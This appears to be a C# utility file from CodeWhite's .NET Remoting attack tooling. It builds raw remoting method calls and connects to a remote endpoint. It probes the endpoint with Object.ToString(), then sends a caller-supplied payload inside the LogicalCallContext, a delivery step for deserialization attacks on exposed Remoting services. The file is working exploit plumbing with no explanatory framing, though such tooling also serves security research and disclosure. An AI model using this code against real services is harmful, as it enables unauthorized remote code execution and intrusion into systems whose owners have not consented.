using System;
using System.Linq;
using System.Reflection;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Messaging;

namespace CodeWhite.Remoting.Shared
{
    public class Utils
    {
        public static MethodCall CreateMethodCall(Uri uri, MethodInfo method, object[] methodArgs)
        {
            var methodSignature = method.GetParameters().Select(p => p.ParameterType).ToArray();
            var methodCall = new MethodCall(
                new Header[]
                {
                    new Header("__Uri", uri.AbsolutePath),
                    new Header("__TypeName", method.DeclaringType.AssemblyQualifiedName),
                    new Header("__MethodName", method.Name),
                    new Header("__MethodSignature", methodSignature),
                    new Header("__Args", methodArgs),
                }
            );
            return methodCall;
        }
        public static IMethodReturnMessage InvokeMethodCall(Uri url, object logicalCallContextData)
        {
            var transparentProxy = RemotingServices.Connect(typeof(MarshalByRefObject), url.ToString());
            var remotingProxy = RemotingServices.GetRealProxy(transparentProxy);

            // create method call to `object.ToString()`
            var method = typeof(object).GetMethod("ToString", new Type[0]);
            var methodArgs = new object[0];
            MethodCall methodCall = Utils.CreateMethodCall(url, method, methodArgs);

            IMethodReturnMessage methodReturnMessage;

            // call `object.ToString()` remotely
            methodReturnMessage = (IMethodReturnMessage)remotingProxy.Invoke(methodCall);
            Console.WriteLine($"[*] Remote `Object.ToString()`: {methodReturnMessage.ReturnValue}");

            // send payload in the `LogicalCallContext`
            methodCall.LogicalCallContext.SetData("MBRO", logicalCallContextData);
            methodReturnMessage = (IMethodReturnMessage)remotingProxy.Invoke(methodCall);
            return methodReturnMessage;
        }
    }
}
